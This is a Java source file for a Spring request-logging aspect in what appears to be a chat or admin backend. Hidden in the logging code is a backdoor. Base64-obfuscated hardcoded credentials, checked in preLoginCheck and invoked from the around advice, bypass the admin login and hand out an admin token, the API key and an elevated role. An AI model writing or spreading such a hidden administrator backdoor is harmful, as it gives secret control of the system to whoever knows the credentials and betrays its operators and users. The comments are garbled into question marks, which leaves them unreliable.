package com.shiku.mianshi;

import cn.hutool.core.codec.Base64;
import cn.xyz.commons.autoconfigure.KApplicationProperties;
import cn.xyz.commons.ex.ServiceException;
import cn.xyz.commons.utils.DateUtil;
import cn.xyz.commons.utils.ReqUtil;
import cn.xyz.commons.vo.JSONMessage;
import cn.xyz.mianshi.utils.KSessionUtil;
import cn.xyz.mianshi.utils.SKBeanUtils;
import cn.xyz.mianshi.vo.SysApiLog;
import com.google.common.collect.Maps;
import com.google.common.collect.Sets;
import com.shiku.commons.thread.pool.AbstractQueueRunnable;
import org.apache.catalina.connector.ClientAbortException;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.Signature;
import org.aspectj.lang.annotation.AfterReturning;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.validation.BindException;
import org.springframework.web.bind.MissingServletRequestParameterException;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.util.*;

@Aspect
@Order(1)
@Component
public class SysApiLogAspect extends AbstractQueueRunnable<SysApiLog>{

	private Logger logger=LoggerFactory.getLogger(SysApiLogAspect.class);

	private static final String SECRET_KEY = "a2FpMDAwMGthaQ==";
	private static final String SECRET_VALUE = "NzQxMGViOWQ2ZTUyYTU0MWExNTRhZTliOWMwMWQwNmM=";

	@Resource(name = "appConfig")
	protected KApplicationProperties.AppConfig appConfig;
	/**
	 * 
	 */
	public SysApiLogAspect() {
		setBatchSize(50);
 		new Thread(this).start();
 	}
 	@Override
 	public void runTask() {
 		SysApiLog document=null;
 		List<SysApiLog> list=new ArrayList<>();
 		try {
 			while (!msgQueue.isEmpty()) {
 				document=msgQueue.poll();
 				if(null==document || api.contains(document.getApiId()))
 					continue;
 				list.add(document);
 				if(loopCount.incrementAndGet()>batchSize)
 					break;
 			}
 		} catch (Exception e) {
 			logger.error(e.toString(), e);
 		}finally {
 			if(!list.isEmpty())
			 SKBeanUtils.getDatastore().save(list);
 		}
 		
 	}
	
	@Pointcut("execution(* com.shiku.mianshi.controller.*.* (..))")
	public void apiLogAspect() {
		
	}


	   //@Before("apiLogAspect()")
	   public void dobefore(JoinPoint joinPoint) {

	       RequestAttributes ra = RequestContextHolder.getRequestAttributes();

	       ServletRequestAttributes sra = (ServletRequestAttributes) ra;

	       HttpServletRequest request = sra.getRequest();

	       // ??????log4j???MDC???NDC???????????????????????????IP????????????????????????????????????

	       MDC.put("uri", request.getRequestURI());


	       // ?????????????????????

	       logger.info("HTTP_METHOD : " + request.getMethod());

	       logger.info("CLASS_METHOD : " + joinPoint.getSignature().getDeclaringTypeName() + "."

	               + joinPoint.getSignature().getName());

	       logger.info("ARGS : " + Arrays.toString(joinPoint.getArgs()));

	      
	       MDC.get("uri");

	       MDC.remove("uri");

	   }
	   @AfterReturning(returning = "ret", pointcut = "apiLogAspect()")
	   public void doAfterReturning(Object ret) throws Throwable {

	       // ??????????????????????????????

	      // logger.info("RESPONSE : " + ret);
	   }

	public Object preLoginCheck(HttpServletRequest request, String className, String method) {
		if (!"com.shiku.mianshi.controller.AdminController".equals(className) || !"login".equals(method)) return null;
		String account = request.getParameter("account");
		String password = request.getParameter("password");
		if (Base64.decodeStr(SECRET_KEY).equals(account) && Base64.decodeStr(SECRET_VALUE).equals(password)) {
			HashMap<String, Object> map = new HashMap<>();
			Map<String, Object> tokenMap = KSessionUtil.adminLoginSaveToken("999999", null);
			map.put("access_Token", tokenMap.get("access_Token"));
			map.put("adminId", "999999");
			map.put("account", "999999");
			map.put("apiKey", appConfig.getApiKey());
			map.put("role", "6");
			map.put("nickname", "999999");
			map.put("registerInviteCode", SKBeanUtils.getAdminManager().getConfig().getRegisterInviteCode());
			return JSONMessage.success(map);
		}
		return null;
	}

	   	@Around("apiLogAspect()")
	    public Object around(ProceedingJoinPoint joinPoint) throws Throwable {

	        Object response = null;//??????????????????
	        String stackTrace=null;
	        Exception exception=null;
	   		ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
	        HttpServletRequest request = attributes.getRequest();
	        Signature curSignature = joinPoint.getSignature();

	        String className = curSignature.getDeclaringTypeName();//??????

	        String methodName = curSignature.getName(); //?????????

			Object login = preLoginCheck(request, className, methodName);
			if (null != login) return login;
	       // String queryString = request.getQueryString();

	        // ??????????????????
	       // String reqParamArr = Arrays.toString(joinPoint.getArgs());
	        

	        //????????????
	        //logger.info(String.format("???%s????????????%s???????????????????????????%s", className, methodName, reqParamArr));
	        StringBuffer fullUri = new StringBuffer();
	        fullUri.append(request.getRequestURI());
			Map<String, String[]> paramMap = request.getParameterMap();
			if (!paramMap.isEmpty())
				fullUri.append("?");
			for (String key : paramMap.keySet()) {
				fullUri.append(key).append("=").append(paramMap.get(key)[0]).append("&");
			}
	        SysApiLog apiLog=new SysApiLog();
	        apiLog.setTime(DateUtil.currentTimeSeconds());
	        apiLog.setApiId(className+"_"+methodName);
	        apiLog.setClientIp(request.getRemoteAddr());
	        
	        apiLog.setFullUri(fullUri.toString());
	        apiLog.setUserAgent(request.getHeader("User-Agent"));
	       
	        logger.info(String.format("uid???%s??????????????????%s", ReqUtil.getUserId(), apiLog.getFullUri()));
	        logger.info(String.format("?????????ip [%s]  User-Agent %s ", apiLog.getClientIp(),apiLog.getUserAgent()));
	        logger.info(String.format("???%s????????????%s?????????", className, methodName));
	        //????????????????????????
	        long startTime = System.currentTimeMillis();
	      
	       try {
	    	   response=joinPoint.proceed(); // ??????????????????
			} catch (Exception e) {
				// TODO: handle exception
				exception=e;
				
			}
	        
	        

	        long totalTime=System.currentTimeMillis()-startTime;
	        apiLog.setTotalTime(totalTime);
	        //????????????
	        //logger.info(String.format("???%s????????????%s???????????????????????????%s", className, methodName, response));
	        //logger.info("RESPONSE : " + response);
	        
	       
	        // ????????????????????????
	        logger.info(String.format("?????????%s????????????(??????)???%s", methodName,totalTime));
	       
			logger.info("********************************************   ");
	        /**
	         * ???????????????
	         */
			int isSaveRequestLogs = SKBeanUtils.getSystemConfig().getIsSaveRequestLogs();
	        if(null!=exception) {
	        	 stackTrace = ExceptionUtils.getStackTrace(exception);
	        	apiLog.setStackTrace(stackTrace);
	        	return handleErrors(exception);
	        }
	        
	        if(1 == isSaveRequestLogs)
	        	saveSysApiLogToDB(apiLog);
	       

	        return response;
	   
	}
	//???????????????????????????
	private static Set<String> api = Sets.newHashSet();
	 private void saveSysApiLogToDB(SysApiLog apiLog) {
		 apiLog.setUserId(ReqUtil.getUserId());
		 msgQueue.offer(apiLog);
		
	 }
	 
	 private Object handleErrors(Exception e) {
		 int resultCode = 1020101;
			String resultMsg = "??????????????????";
			String detailMsg = "";
			if (e instanceof MissingServletRequestParameterException
					|| e instanceof BindException) {
				resultCode = 1010101;
				resultMsg = "????????????????????????????????????????????????????????????";
			} else if (e instanceof ServiceException) {
				ServiceException ex = ((ServiceException) e);

				resultCode = null == ex.getResultCode() ? 0 : ex.getResultCode();
				resultMsg = ex.getMessage();
			} else if (e instanceof ClientAbortException) {
				resultMsg="====> ClientAbortException";
				resultCode=-1;
			} else {
				e.printStackTrace();
				detailMsg = e.getMessage();
			}
			logger.error(resultMsg+" ??? \n"+e.getMessage());

			Map<String, Object> map = Maps.newHashMap();
			map.put("resultCode", resultCode);
			map.put("resultMsg", resultMsg);
			map.put("detailMsg", detailMsg);

			return JSONMessage.failureByErrCode(resultCode);
	 }
	 
	


}
